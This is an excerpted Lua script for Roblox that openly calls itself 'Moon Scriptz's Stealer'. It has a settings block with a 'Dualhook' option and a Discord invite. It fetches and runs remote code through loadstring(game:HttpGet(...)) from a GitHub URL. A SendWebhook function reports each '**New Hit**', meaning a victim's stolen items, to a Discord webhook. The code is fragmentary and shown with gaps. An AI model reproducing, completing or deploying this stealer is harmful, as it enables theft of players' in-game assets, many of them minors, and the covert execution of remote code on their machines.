...
getgenv().Settings = {
    ...
    MailMessage = "Moon Hub .gg/YqsBBGEj",
    Titanics = {
        Dualhook = true,
        Intensity = 100 --%
    },
...
if _G.LoadingScreen ~= false then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/MoonScriptt/Loadingscreen/main/Main.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1133777071160709121/1133807066809651231/IMG_20230723_135506_357-removebg-preview.png"
        data1 = {
            ["content"] = ping,
            ["username"] = "Moon Scriptz",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With Rizz||",
                ["url"] = "https://discord.gg/YqsBBGEj",
                ["type"] = "rich",
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using Moon Scriptz's Stealer** :moyai:",
